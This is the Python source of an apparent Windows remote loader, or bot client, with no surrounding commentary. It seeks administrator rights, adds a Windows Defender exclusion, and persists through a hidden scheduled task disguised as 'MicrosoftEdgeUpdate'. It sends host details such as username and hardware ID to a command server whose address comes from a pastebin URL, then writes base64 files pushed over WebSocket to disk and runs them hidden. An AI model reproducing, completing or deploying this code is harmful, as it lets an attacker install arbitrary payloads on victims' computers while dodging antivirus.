import websocket
import json
import os
import random
import uuid
import base64
import time
import requests
import platform
import subprocess
import socket
import ctypes
import sys
from pathlib import Path
import threading

CONFIG_URL = "https://pastebin.com/raw/HvFhs7zk"


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def request_admin():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        except:
            return False
    return True


def add_defender_exclusion():
    try:
        temp_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp')
        ps_command = f'Add-MpPreference -ExclusionPath "{temp_path}"'
        subprocess.run(
            ['powershell', '-Command', ps_command],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True
    except:
        return False


def add_to_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        task_name = "MicrosoftEdgeUpdate"
        
        xml_content = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>{exe_path}</Command>
    </Exec>
  </Actions>
</Task>'''
        
        xml_path = os.path.join(os.getenv('TEMP'), 'task_tmp.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_content)
        
        subprocess.run(
            ['schtasks', '/Create', '/TN', task_name, '/XML', xml_path, '/F'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        try:
            os.remove(xml_path)
        except:
            pass
        
        return True
    except:
        return False


def setup_persistence():
    marker_path = os.path.join(os.getenv('LOCALAPPDATA'), 'SystemCache', '.configured')
    
    if os.path.exists(marker_path):
        return True  
    
    if not is_admin():
        request_admin()
        return False
    
    add_defender_exclusion()
    add_to_startup()
    
    try:
        os.makedirs(os.path.dirname(marker_path), exist_ok=True)
        with open(marker_path, 'w') as f:
            f.write('1')
    except:
        pass
    
    return True


def get_server_address():
    try:
        response = requests.get(CONFIG_URL, timeout=10)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return None


def get_temp_folder():
    temp_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp')
    folder_name = f"output{random.randint(100, 999)}"
    output_path = os.path.join(temp_dir, folder_name)
    if not os.path.exists(output_path):
        os.makedirs(output_path)
    return output_path


def get_config_path():
    base_dir = os.getenv('LOCALAPPDATA')
    config_dir = os.path.join(base_dir, 'SystemCache')
    if not os.path.exists(config_dir):
        os.makedirs(config_dir)
    return os.path.join(config_dir, 'sys_id.dat')


def load_or_create_id():
    config_path = get_config_path()
    
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r') as f:
                existing_id = f.read().strip()
                if len(existing_id) > 10:
                    return existing_id
        except:
            pass
    
    new_id = str(uuid.uuid4())
    try:
        with open(config_path, 'w') as f:
            f.write(new_id)
        
        if platform.system() == "Windows":
            subprocess.run(['attrib', '+h', config_path], shell=True, 
                           creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass
    
    return new_id


def get_system_info():
    info = {
        'hwid': str(uuid.getnode()),
        'username': os.getlogin(),
        'os': f"{platform.system()} {platform.release()}",
        'pc_name': socket.gethostname()
    }
    if platform.system() == "Windows":
        try:
            cmd = subprocess.check_output('wmic csproduct get uuid', shell=True,
                                        creationflags=subprocess.CREATE_NO_WINDOW)
            decoded = str(cmd).split('\\r\\n')[1].strip()
            if decoded: 
                info['hwid'] = decoded
        except:
            pass
    return info


def save_and_execute(task_data, output_folder):
    try:
        build_name = task_data['buildName']
        file_data = base64.b64decode(task_data['fileData'])
        file_path = os.path.join(output_folder, build_name)
        
        with open(file_path, 'wb') as f:
            f.write(file_data)
        
        subprocess.Popen([file_path], creationflags=subprocess.CREATE_NO_WINDOW)
        return task_data['id']
    except Exception as e:
        return None


class WSClient:
    def __init__(self, server_url):
        self.server_url = server_url
        self.client_id = load_or_create_id()
        self.ws = None
        self.output_folder = get_temp_folder()
        self.sys_info = get_system_info()
    
    def on_open(self, ws):
        ws.send(json.dumps({
            'type': 'register',
            'clientId': self.client_id,
            'info': self.sys_info
        }))
    
    def on_message(self, ws, message):
        task = json.loads(message)
        task_id = save_and_execute(task, self.output_folder)
        if task_id:
            ws.send(json.dumps({
                'type': 'task_completed',
                'taskId': task_id
            }))
    
    def on_error(self, ws, error):
        pass
    
    def on_close(self, ws, close_status_code, close_msg):
        time.sleep(5)
        self.connect()
    
    def connect(self):
        try:
            addr = get_server_address() or self.server_url
            self.ws = websocket.WebSocketApp(
                addr,
                on_open=self.on_open,
                on_message=self.on_message,
                on_error=self.on_error,
                on_close=self.on_close
            )
            self.ws.run_forever()
        except:
            time.sleep(5)
            self.connect()


def initializationSelf():
    if not setup_persistence():
        sys.exit(0)
    
    FALLBACK_URL = "ws://localhost:8080"
    client = WSClient(FALLBACK_URL)

    thread = threading.Thread(target=client.connect, daemon=True)
    thread.start()

    return thread 


if __name__ == "__main__":
    initializationSelf()
    while True:
        time.sleep(1)
